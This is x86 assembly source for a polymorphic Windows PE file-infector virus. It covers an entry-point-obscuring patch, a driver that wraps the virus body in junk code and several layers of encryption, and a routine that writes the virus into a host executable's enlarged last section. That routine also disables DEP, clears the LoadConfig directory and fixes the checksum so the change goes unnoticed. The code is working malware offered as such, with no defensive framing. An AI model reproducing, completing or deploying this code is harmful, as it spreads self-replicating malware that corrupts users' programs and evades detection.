                assume ebp:ptr vars
;---------------------------------------------------------------------------;
;                prepare EPO patch                      ;
;---------------------------------------------------------------------------;                
do_epo_patch_2:         push ebx
                mov dword ptr [ebp].epo_do_direct_call,0 ; default (relative call)

                jmp do_epo_patch_now ;DEBUG !!!
                ; find import table
                    
                mov ebx, dword ptr [ebp].ptrMappedImage
                add ebx, dword ptr [ebx + 3ch]
                add ebx, 4                     ; IMAGE_NT_HEADER
                movzx eax,word ptr [ebx + 18]     ; characteristics 
                and eax,1
                test eax,eax
                jz do_epo_patch_now ; image can be relocated , mem32 patch cannot be used 
                    
                add ebx, 20                    ; sizeof image_nt_header
                mov eax,dword ptr [ebx + 104]  ; rva import table
                call RvaToRaw 
                test eax,eax
                jz do_epo_patch_now
 
                add eax,dword ptr [ebx + 108]  ; it size

                cmp dword ptr [eax],0 ; tasm/masm images have incorrect IT size in dir 
                jne do_epo_patch_now
                    
                add dword ptr [ebx + 108],4 ; increase it size 
                
                ; put dword ptr behind it
                mov ebx,dword ptr [ebp].decryptor_ep_VA  
                mov dword ptr [eax],ebx 
                
                call RawToVa
                ; set epo to point to this address 
                mov dword ptr [ebp].decryptor_ep_VA,eax  
                mov dword ptr [ebp].epo_do_direct_call,1 
                
do_epo_patch_now:       call epo 
                    
                pop ebx  
                retn
                    
                    
;---------------------------------------------------------------------------;
;           Prepare crypted copy of virus to buffer                 ;
;---------------------------------------------------------------------------;                   
; edx = virus buffer base VA                    
polymorph_virus:        pushad
                and dword ptr [ebp].virus_state_flags,-2
                
                ; allocate buffer 
                mov eax,VIRUS_MEM_ALLOC_SIZE
                call AllocateMem
                test eax,eax 
                jz PrepareFail; alloc error 
                mov dword ptr [ebp].ptrVirusBuffer,eax
                    
                ;--------------------------------------;
                ;  Allocate poly_vars struct on stack  ;
                ;--------------------------------------;
                mov ecx,( sizeof poly_vars / 4 ) + 1
@@:             push 0
                loop @b
                mov ebx,esp
                
                assume ebx:ptr poly_vars
                    
                ;--------------------------------------;
                ;    Set poly junk mem reads dest      ;
                ;--------------------------------------;
                ; junk accesses are not keen on fixed memory location
                ; because delta_offset is used
                
                ; setup junk mem accesses to .data 
                mov eax,dword ptr [ebp].number_of_sect
                cmp eax,1 ; more than one section ?
                je @f
                
                mov esi,dword ptr [ebp].ptr_sect_headers
                add esi,40  ;sizeof section_header 
                
                ; assume that second section is data
                ; even wrong assumtion will not cause error
                mov eax,dword ptr [esi + 8] ; virtual size
                cmp eax,100 
                jb @f
                
                mov dword ptr [ebx].poly_read_mem_size,0;eax 
                
                mov eax,dword ptr [esi + 12] ; virtual address
                mov esi,dword ptr [ebp].ptr_opt_header
                add eax,dword ptr [esi + 28] ; image base 
                 
                mov dword ptr [ebx].poly_read_mem_base,0;eax
@@:             
                
                ;--------------------------------------;
                ;    Gen trash before virus        ;
                ;--------------------------------------;
                ; generate random amount of trash bytes                 
                mov edi,dword ptr [ebp].ptrVirusBuffer
; generate trash loop 1                 
                mov eax,VIRUS_TRASH_BYTES_MAX 
                call rand
                test eax,eax
                jz @f 
                 
                mov ecx,eax  
trash_loop_1:           mov eax,-1
                call rand
                stosb
                loop trash_loop_1    
@@:
                ;----------------------------------------------------;
                ;   generate garbage code here before the virus ep   ;
                ;----------------------------------------------------;
                mov dword ptr [ebx].poly_decryptor_base,edi
                mov eax,edi
                sub eax,dword ptr [ebp].ptrVirusBuffer
                add eax,edx ; poly decryptor va
                mov dword ptr [ebx].poly_decryptor_base_va,eax 
                mov dword ptr [ebx].poly_garbage_level,5 
                mov dword ptr [ebx].poly_options,0;POLY_OPT_POS_INDEPENDENT ;OR POLY_OPT_USE_SUBROUTINES
                mov eax,ebx
                mov ecx,5 ; garbage amount 
                call PolyCreateGarbage
                    
                ;--------------------------------------;
                ;      Copy virus body to buffer       ;
                ;--------------------------------------;
                mov esi,dword ptr [ebp].OrigVirusEntryVa
                mov dword ptr [ebp].VirusEntryVa,edi
                add edi,eax ; created garbage size  
                mov ecx,VIRUS_SIZE
                rep movsb

                ;--------------------------------------;
                ;        Gen trash after virus         ;
                ;--------------------------------------;                    
                ; generate trash loop 2                 
                mov eax,VIRUS_TRASH_BYTES_MAX
                call rand
                test eax,eax
                jz @f 
                mov ecx,eax  
trash_loop_2:           mov eax,-1
                call rand
                stosb
                loop trash_loop_2
@@:                     
                 
                ;--------------------------------------;
                ;       Prepare poly structure         ;
                ;--------------------------------------;  
                ; set code_base va  
                mov eax ,dword ptr [ebp].ptrVirusBuffer
                mov dword ptr [ebx].poly_ptr_code_base_va,eax ;edx ; edx = virus buffer base VA
                mov eax,dword ptr [ebp].ptrVirusBuffer
                ; set code_base raw 
                mov dword ptr [ebx].poly_ptr_code_base_raw,eax 
                    
                ; poly_entry 
                mov eax,dword ptr [ebp].VirusEntryVa
                sub eax,dword ptr [ebp].ptrVirusBuffer
                mov dword ptr [ebx].poly_code_entry_offset,eax
                add eax,edx ; edx = virus buffer base VA
                mov dword ptr [ebp].VirusEntryVa,eax
                    
                ;  set poly decryptor base raw
                ;  set base_raw and base_va to same value and poly_options to POS_INDEPENDENT  
                ;  that will make decryptor fully position independent 
                ;  dont use memory reads/writes in such a case 
                mov eax,edi
                add eax,10
                mov dword ptr [ebx].poly_decryptor_base,eax
                mov dword ptr [ebx].poly_decryptor_base_va,eax
                    
                ;  count virus size
                sub eax,dword ptr [ebp].ptrVirusBuffer
                mov dword ptr [ebx].poly_code_size,eax 
                mov dword ptr [ebp].dwVirusSize,eax 
                     
                ;  set poly options
                mov dword ptr [ebx].poly_garbage_level,2 
                mov dword ptr [ebx].poly_options,POLY_OPT_POS_INDEPENDENT
                    
                ; create N poly layers 
                mov eax,VIRUS_POLY_LAYERS_MAX
                call rand
                test eax,eax
                jz @f
                mov ecx,eax
                    
CreateLayer:            mov eax,ebx 
                call PolyEngine

                ; set new code entry offset 
                push edx
                mov edx,dword ptr [ebx].poly_decryptor_base
                add edx,dword ptr [ebx].poly_entry_offset
                sub edx,dword ptr [ebp].ptrVirusBuffer
                mov dword ptr [ebx].poly_code_entry_offset,edx
                pop edx 
                    
                add eax,10
                add dword ptr [ebx].poly_decryptor_base,eax     ; add size of decryptor
                add dword ptr [ebx].poly_decryptor_base_va,eax  ; add size of decryptor
                add dword ptr [ebx].poly_code_size,eax          ; add size of decryptor
            
                loop CreateLayer 
@@:

            ;----------------------------------------------------------;
            ;        Create On-Top Decryptor               ; 
            ;----------------------------------------------------------;
                ; this decryptor will move code in memory 
                ;---------------------------------------------------;
                ;   Find section to which virus will be decrypted   ; 
                ;---------------------------------------------------;
                ;   find first section big enough to store virus 
                push edi
                mov ecx,dword ptr [ebp].number_of_sect
                dec ecx    ; skip last section
                mov edi,dword ptr [ebp].ptr_sect_headers
                
find_writ_loop:         add edi,40 ; skip first section 
                ; is big enough ?
                mov eax,dword ptr [ebp].dwVirusSize
                add eax,1000h
                push ecx
                mov ecx,1000h
                call AlignVal
                pop ecx
                    
                cmp eax,dword ptr [edi + 8] ; virtual size
                jbe found_section
                loop find_writ_loop 
                jmp @f 

                ;  set writable flag 
found_section:          or dword ptr [edi + 36],80000000h ; characteristic set writable flag  
                mov esi,dword ptr [edi + 12] ; virtual address
                mov edi,dword ptr [ebp].ptr_opt_header
                add esi,dword ptr [edi + 28] ; image_base 
                mov dword ptr [ebx].poly_ptr_decrypt_buf_va,esi
                xor dword ptr [ebp].virus_state_flags,VIRUS_STATE_MAKE_LAST_WRITABLE 

@@:             pop edi 

                ; resetup poly decryptor_base_va 
                mov eax,dword ptr [ebx].poly_decryptor_base
                sub eax,dword ptr [ebp].ptrVirusBuffer
                add eax,edx
                mov dword ptr [ebx].poly_decryptor_base_va,eax 
 
                mov dword ptr [ebx].poly_ptr_code_base_va,edx ;= virus buffer base VA
                mov dword ptr [ebx].poly_garbage_level,2
                mov dword ptr [ebx].poly_options,POLY_OPT_POS_INDEPENDENT ;OR POLY_OPT_USE_SUBROUTINES ;OR POLY_OPT_MEM_ACC_DIRECT
                    
                mov eax,ebx 
                call PolyEngine
                ; count virus size
                add eax,dword ptr [ebx].poly_code_size ; eax = code_size + decryptor size 
                mov dword ptr [ebp].dwVirusSize,eax
                    
                ; count virus entry va
                mov eax,dword ptr [ebx].poly_decryptor_base
                add eax,dword ptr [ebx].poly_entry_offset 
                sub eax,dword ptr [ebp].ptrVirusBuffer
                add eax,edx ; eax = relative entry + virus base va
                mov dword ptr [ebp].VirusEntryVa,eax 
            
;               mov edx,dword ptr [ebx].poly_decryptor_base
;               add edx,dword ptr [ebx].poly_entry_offset
;               call edx 
                
;               add eax,VIRUS_SIZE + 20
;               mov dword ptr [ebp].VirusEntryVa,eax 
                
             
;               loop PreparePolLayer  
                add esp,sizeof poly_vars + 4 
                assume ebx:nothing
                mov dword ptr [esp + 1ch],1  
                    
PrepareFail:            xor eax,eax

                popad
                retn  
                    
                                
;---------------------------------------------------------------------------;
;                    infect_3 - enlarge last section                        ; 
;---------------------------------------------------------------------------;
; infection type 1 - append section 
;           type 2 - if reloc is last - enlarge , mov reloc , put virus  (rgb style) 
;           type 3 - enlarge last section - impemented in this viry 
;           type 4 - infect pading cavities

; __in  : eax = ptr mapped module
; __in  : ebx = ptr filename 
; __out : eax = 0 -> infection failed 
;         eax = 1 -> infection successfull
infect_3:               call get_last_sec
                
                ; pick smaller
                mov esi,dword ptr [eax + 16]  ; size of raw data
                cmp dword ptr [eax + 8],0 ;
                je @f
                cmp dword ptr [eax + 8],esi
                jae @f
                mov esi,dword ptr [eax + 8] ; virtual_size 
                
@@:             mov edi,dword ptr [ebp].ptr_opt_header
                add esi,dword ptr [edi + 28]  ; image_base 
                add esi,dword ptr [eax + 12]  ; virtual address 
                
                mov edx,esi
                call polymorph_virus
                
                mov esi,dword ptr [ebp].VirusEntryVa ; is raw at this stage 
                mov dword ptr [ebp].decryptor_ep_VA,esi
                
                mov dword ptr [ebp].number_of_epo_patches,0
                call do_epo_patch_2
                ; if zero patches occured , file is either infected or not suitable 
                cmp dword ptr [ebp].number_of_epo_patches,0
                je infect_3_fail 
 
                ; okey file is suitable and epo patch is allready applied 
                ; remap file and put virus body to appropriate place 
                 
                push ebx
                ; get size of file
                push 0
                push [ebp].hFile
                call [ebp].aGetFileSize
                push eax
            
                ; align virus_size to file alignment
                mov eax,dword ptr [ebp].dwVirusSize
                mov ecx,dword ptr [ebp].ptr_opt_header
                mov ecx,dword ptr [ecx + 36] ; file alignment
                call AlignVal
            
                ; remap file with increased size 
                call UnmapFile
                
                pop ecx ; file size 
                add ecx,eax
                pop eax ; filename 
                call MapFile 
                
                test eax,eax
                jz InfectFail ; file mapping failed
                    
                ; setup ptr_opt_header in case the image was mapped to different memory
                push eax
                add eax, dword ptr[eax + 3ch]
                add eax, 24                    ; sizeof IMAGE_NT_HEADER + SIGN
                mov dword ptr [ebp].ptr_opt_header,eax
                pop eax 
                 
                ; find last section 
                call get_last_sec
        
                ; set writable flag
                push ebx
                mov ebx,dword ptr [ebp].virus_state_flags
                and ebx,VIRUS_STATE_MAKE_LAST_WRITABLE
                test ebx,ebx
                pop ebx 
                jnz @f  
                or dword ptr [eax + 36],80000000h
@@:             
                ; pick smaller value virtual_size/raw_size
                mov edi, dword ptr [eax + 16]  ; size of raw data
                cmp dword ptr [eax + 8],0      ; sometimes 0 virtual_size occur
                je @f
                cmp dword ptr [eax + 8],edi    ; virtual_size
                jae @f
                mov edi, dword ptr [eax + 8] 
                
@@:             add edi, dword ptr [eax + 20]  ; pointer to raw data
                add edi, dword ptr [ebp].ptrMappedImage ; add mapped_image_base
            
                ; copy virus body
                mov esi,dword ptr[ebp].ptrVirusBuffer
                mov ecx,dword ptr[ebp].dwVirusSize
                rep movsb
                
                ; enlarge last section
                ; align VIRUS_SIZE to section alignment
                push eax
    
                mov eax,dword ptr [ebp].dwVirusSize
                mov ebx,dword ptr [ebp].ptr_opt_header
                mov ecx,dword ptr [ebx + 32] ; section alignment
                call AlignVal
                mov ecx,eax
                pop eax
                
                add dword ptr [ebx + 56],ecx   ; optional header -> imageSize
                add dword ptr [eax + 8],ecx    ; section header  -> virtual size
                
                ; align raw_size to file alignment
                mov ecx,dword ptr [ebp].dwVirusSize
                add ecx,dword ptr [eax + 16] ; section header  -> sizeof raw data
                push eax
                mov eax,ecx
                mov ecx,dword ptr [ebx + 36] ; file alignment
                call AlignVal
                mov ecx,eax
                pop eax
                mov dword ptr [eax + 16],ecx
                
                push eax
                mov eax,dword ptr [ebp].dwVirusSize
                add dword ptr [ebx + 8],eax ; sizeof init data
                pop eax
                    
                mov ebx,dword ptr [ebp].ptr_opt_header
                
                ; unset DllCharacteristics NxCompatible flag to disable DEP 
                and word ptr [ebx + 70],0FEFFh
                
                ; zero LoadConfig table Data directory entry in optional header 
                mov dword ptr [ebx + 176],0
                mov dword ptr [ebx + 180],0
                    
                ;cmp dword ptr [ebx + 64],0 ; does pe header contain checksum 
                ;jz @f ; no checksum
                    
                ; update checksum
            
                ; count the size
                mov eax,dword ptr [ebp].ptrMappedImage
                push eax
                call get_last_sec
                mov ecx,dword ptr [eax + 20] ; Pointer to raw data 
                add ecx,dword ptr [eax + 16] ; sizeof raw data
                pop eax
                call Checksum_File  
                    
                ;save checksum 
                mov dword ptr [ebx + 64],eax 
@@:
infect_3_fail:              
infect_3_end:           mov eax,dword ptr [ebp].ptrVirusBuffer
                test eax,eax 
                jz @f
                mov ecx,VIRUS_MEM_ALLOC_SIZE 
                call FreeMem
@@:             xor eax,eax 
                retn
